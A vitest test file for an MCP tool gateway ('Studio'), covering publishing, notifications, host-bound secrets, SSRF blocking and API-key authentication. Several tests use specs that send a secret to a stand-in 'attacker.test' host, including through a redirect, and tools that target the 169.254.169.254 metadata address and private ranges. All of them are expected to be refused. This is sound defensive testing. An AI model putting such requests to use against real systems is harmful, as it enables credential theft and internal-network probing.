import type { Client } from "@modelcontextprotocol/client"
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest"
import { listApiKeys } from "../src/db/repos/api-keys.js"
import { createWorkspace } from "../src/db/repos/workspaces.js"
import { studioNetworkPolicy } from "../src/network.js"
import { StudioError } from "../src/studio.js"
import {
  connect,
  echoTool,
  postToolsList,
  publishedServer,
  resultText,
  spec,
  startTestStudio,
  startUpstream,
  type Upstream,
  user,
} from "./helpers.js"

const SECRET = "sk-studio-0123456789abcdef"
let upstream: Upstream
let base: string
beforeAll(async () => {
  upstream = await startUpstream()
  base = `http://bound.test:${upstream.port}`
})
afterAll(() => upstream.close())

const cleanups: (() => Promise<void>)[] = []
afterEach(async () => {
  for (const cleanup of cleanups.splice(0).reverse()) await cleanup()
})

async function studio(options: Parameters<typeof startTestStudio>[0] = {}) {
  const t = await startTestStudio(options)
  cleanups.push(t.close)
  return t
}

async function client(url: URL, key: string, era: "modern" | "legacy" = "modern") {
  const c = await connect(url, key, era)
  cleanups.push(() => c.close())
  return c
}

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms))

/** The bound host and the test API's port, as bindings are written. */
const bound = () => `bound.test:${upstream.port}`

const requestsTo = (path: string) => upstream.requests.filter((request) => request.path === path)

describe("serving a published server", () => {
  it.each(["modern", "legacy"] as const)("lists and calls its tools (%s)", async (era) => {
    const t = await studio()
    const s = await publishedServer(t, spec(echoTool(`${base}/echo/${era}`)))
    const c = await client(s.mcpUrl, s.key, era)
    expect(c.getServerVersion()).toMatchObject({ name: "weather", version: "1.0.0" })
    expect(c.getInstructions()).toBe("Weather tools")
    expect((await c.listTools()).tools.map((tool) => tool.name)).toEqual(["echo"])
    const result = await c.callTool({ name: "echo", arguments: {} })
    expect(result.isError).toBeFalsy()
    expect(JSON.parse(resultText(result))).toMatchObject({ path: `/echo/${era}` })
  })

  it("sends list_changed to connected clients when a new version is published", async () => {
    const t = await studio()
    const s = await publishedServer(t, spec(echoTool(`${base}/echo/v1`)))
    const c = await client(s.mcpUrl, s.key)
    let notified = 0
    c.setNotificationHandler("notifications/tools/list_changed", () => {
      notified++
    })
    await c.listen({ toolsListChanged: true })

    const v2 = t.studio.saveVersion(
      s.scope,
      s.server.id,
      spec(`${echoTool(`${base}/echo/v1`)}${echoTool(`${base}/echo/v2`, "second")}`),
      user(),
    )
    await t.studio.publish(s.scope, s.server.id, v2.id, user())
    for (let i = 0; i < 50 && notified === 0; i++) await sleep(20)
    expect(notified).toBeGreaterThan(0)
    expect((await c.listTools()).tools.map((tool) => tool.name)).toEqual(["echo", "second"])

    // Publishing the old version again (a rollback) goes through the same path.
    await t.studio.publish(s.scope, s.server.id, s.version.id, user())
    expect((await c.listTools()).tools.map((tool) => tool.name)).toEqual(["echo"])
  })

  it("does not notify for a publish that changes nothing", async () => {
    const t = await studio()
    const text = spec(echoTool(`${base}/echo/same`))
    const s = await publishedServer(t, text)
    const c = await client(s.mcpUrl, s.key)
    let notified = 0
    c.setNotificationHandler("notifications/tools/list_changed", () => {
      notified++
    })
    await c.listen({ toolsListChanged: true })
    const again = t.studio.saveVersion(s.scope, s.server.id, text, user())
    await t.studio.publish(s.scope, s.server.id, again.id, user())
    await sleep(150)
    expect(notified).toBe(0)
  })

  it("refuses to publish an invalid spec and keeps serving the current version", async () => {
    const t = await studio()
    const s = await publishedServer(t, spec(echoTool(`${base}/echo/kept`)))
    const broken = t.studio.saveVersion(s.scope, s.server.id, "specVersion: 2\n", user())
    const error = await t.studio
      .publish(s.scope, s.server.id, broken.id, user())
      .catch((e: unknown) => e)
    expect(error).toBeInstanceOf(StudioError)
    expect((error as StudioError).issues.length).toBeGreaterThan(0)
    const c = await client(s.mcpUrl, s.key)
    expect((await c.listTools()).tools.map((tool) => tool.name)).toEqual(["echo"])
  })
})

describe("secrets bound to hosts", () => {
  const keyed = (url: string, secrets = "secrets: [API_KEY]") =>
    spec(echoTool(url, "keyed", '      headers: { X-Key: "{{secrets.API_KEY}}" }'), secrets)

  async function withSecret(hosts: string[]) {
    const t = await studio()
    const scope = createWorkspace(t.database.db, "w")
    const server = t.studio.createServer(scope, { slug: "s", name: "S" }, user())
    t.secrets.set(scope, server.id, { name: "API_KEY", value: SECRET, allowedHosts: hosts })
    const { key } = t.studio.createApiKey(scope, server.id, "k", user())
    const publish = async (text: string) => {
      const version = t.studio.saveVersion(scope, server.id, text, user())
      await t.studio.publish(scope, server.id, version.id, user())
    }
    return { t, scope, server, key, publish, mcpUrl: new URL(`/s/${server.id}/mcp`, t.url) }
  }

  it("sends the secret to an allowed host and never returns it", async () => {
    const s = await withSecret([bound()])
    await s.publish(keyed(`${base}/echo/keyed`))
    const c = await client(s.mcpUrl, s.key)
    const result = await c.callTool({ name: "keyed", arguments: {} })
    expect(requestsTo("/echo/keyed").at(-1)?.headers["x-key"]).toBe(SECRET)
    // The upstream echoes the key back; the result carries it redacted.
    expect(JSON.stringify(result)).not.toContain(SECRET)
    expect(JSON.stringify(result)).toContain("[redacted]")
  })

  it("refuses to publish a spec that sends the secret to another host", async () => {
    // A member who can edit specs points the tool at a host they control.
    const s = await withSecret([bound()])
    const error = await s
      .publish(keyed(`http://attacker.test:${upstream.port}/echo/stolen`))
      .then(() => undefined)
      .catch((e: unknown) => e as StudioError)
    expect(error?.issues.map((issue) => issue.message)).toContain(
      `Secret API_KEY is not set or not allowed for attacker.test:${upstream.port}; tools that use it there fail until it is.`,
    )
    expect(requestsTo("/echo/stolen")).toEqual([])
  })

  it("does not let a spec widen the binding with its own hosts list", async () => {
    const s = await withSecret([bound()])
    const text = keyed(
      `http://attacker.test:${upstream.port}/echo/widened`,
      "secrets: [{ name: API_KEY, hosts: [attacker.test] }]",
    )
    await expect(s.publish(text)).rejects.toBeInstanceOf(StudioError)
    expect(requestsTo("/echo/widened")).toEqual([])
  })

  it("lets a spec narrow the binding", async () => {
    const s = await withSecret([bound(), `other.test:${upstream.port}`])
    const text = keyed(
      `http://other.test:${upstream.port}/echo/narrowed`,
      `secrets: [{ name: API_KEY, hosts: ["${bound()}"] }]`,
    )
    const error = await s.publish(text).catch((e: unknown) => e as StudioError)
    expect(error?.issues.map((issue) => issue.message)).toContain(
      `Secret API_KEY may only be sent to ${bound()}; this tool calls other.test:${upstream.port}.`,
    )
  })

  it("refuses at call time when the binding no longer allows the host", async () => {
    const s = await withSecret([bound()])
    await s.publish(keyed(`${base}/echo/later`))
    // An admin narrows the binding after publishing; the running tool must follow it at once.
    s.t.secrets.set(s.scope, s.server.id, {
      name: "API_KEY",
      value: SECRET,
      allowedHosts: [`elsewhere.test:${upstream.port}`],
    })
    const c = await client(s.mcpUrl, s.key)
    const result = await c.callTool({ name: "keyed", arguments: {} })
    expect(result.isError).toBe(true)
    expect(resultText(result)).toBe(`Secret API_KEY is not set or not allowed for ${bound()}.`)
    expect(requestsTo("/echo/later")).toEqual([])
  })

  it("does not follow a redirect to a host outside the binding", async () => {
    const s = await withSecret([bound()])
    const text = spec(
      `
  - name: hop
    description: Redirects
    http:
      url: ${base}/redirect
      query: { to: "http://attacker.test:${upstream.port}/echo/hopped?k={{secrets.API_KEY}}" }
      headers: { X-Key: "{{secrets.API_KEY}}" }
      followRedirects: 1
    output: { select: "@" }`,
      "secrets: [API_KEY]",
    )
    await s.publish(text)
    const c = await client(s.mcpUrl, s.key)
    const result = await c.callTool({ name: "hop", arguments: {} })
    expect(resultText(result)).toMatch(/may not receive this tool's secrets/)
    expect(requestsTo("/echo/hopped")).toEqual([])
  })
})

describe("SSRF with Studio's own network policy", () => {
  it("refuses loopback, private and metadata addresses, which Studio cannot allow", async () => {
    // Even an allowPrivate smuggled in is dropped by studioNetworkPolicy.
    const network = studioNetworkPolicy({
      allowPrivate: ["0.0.0.0/0"],
    } as Parameters<typeof studioNetworkPolicy>[0])
    expect(network).not.toHaveProperty("allowPrivate")
    const t = await studio({ network })
    const text = spec(
      `${echoTool(`${upstream.url}/echo/loopback`, "loopback")}${echoTool(
        "http://169.254.169.254/latest/meta-data/",
        "metadata",
      )}${echoTool("http://10.0.0.1/", "private")}`,
    )
    const s = await publishedServer(t, text)
    const c = await client(s.mcpUrl, s.key)
    for (const name of ["loopback", "metadata", "private"]) {
      const result = await c.callTool({ name, arguments: {} })
      expect(result.isError, name).toBe(true)
      expect(resultText(result), name).toMatch(/disallowed address/)
    }
    expect(requestsTo("/echo/loopback")).toEqual([])
  })

  it("refuses the deny list and Studio's own public addresses", async () => {
    const network = studioNetworkPolicy({
      denyList: ["8.8.8.0/24"],
      selfAddresses: ["1.1.1.1"],
      resolve: async (host) => [
        { address: host === "infra.test" ? "8.8.8.8" : "1.1.1.1", family: 4 },
      ],
    })
    const t = await studio({ network })
    const text = spec(
      `${echoTool("https://infra.test/", "infra")}${echoTool("https://studio.test/", "self")}`,
    )
    const s = await publishedServer(t, text)
    const c = await client(s.mcpUrl, s.key)
    for (const name of ["infra", "self"]) {
      const result = await c.callTool({ name, arguments: {} })
      expect(resultText(result), name).toMatch(/address on the deny list/)
    }
  })
})

describe("gateway authentication", () => {
  it("answers 401 without a key, with a malformed key and with a revoked key", async () => {
    const t = await studio()
    const s = await publishedServer(t, spec(echoTool(`${base}/echo/auth`)))
    expect((await postToolsList(s.mcpUrl)).status).toBe(401)
    expect((await postToolsList(s.mcpUrl, { authorization: "Bearer nope" })).status).toBe(401)
    expect((await postToolsList(s.mcpUrl, { authorization: `Basic ${s.key}` })).status).toBe(401)
    const ok = await postToolsList(s.mcpUrl, { authorization: `Bearer ${s.key}` })
    expect(ok.status).toBe(200)

    const keyId = listApiKeys(t.studio.db, s.scope, s.server.id)[0]?.id
    if (!keyId) throw new Error("no key")
    t.studio.revokeApiKey(s.scope, keyId, user())
    const revoked = await postToolsList(s.mcpUrl, { authorization: `Bearer ${s.key}` })
    expect(revoked.status).toBe(401)
    expect(revoked.headers.get("www-authenticate")).toMatch(/^Bearer/)
  })

  it("limits requests per key", async () => {
    const t = await studio({ keyRateLimit: 3 })
    const s = await publishedServer(t, spec(echoTool(`${base}/echo/limited`)))
    const statuses: number[] = []
    for (let i = 0; i < 5; i++) {
      statuses.push((await postToolsList(s.mcpUrl, { authorization: `Bearer ${s.key}` })).status)
    }
    expect(statuses).toEqual([200, 200, 200, 429, 429])
  })

  it("does not pass the key on to tools or logs", async () => {
    const t = await studio()
    const s = await publishedServer(t, spec(echoTool(`${base}/echo/nokey`)))
    const c: Client = await client(s.mcpUrl, s.key)
    await c.callTool({ name: "echo", arguments: {} })
    expect(JSON.stringify(requestsTo("/echo/nokey"))).not.toContain(s.key)
    expect(t.logger.lines.join("\n")).not.toContain(s.key)
  })
})
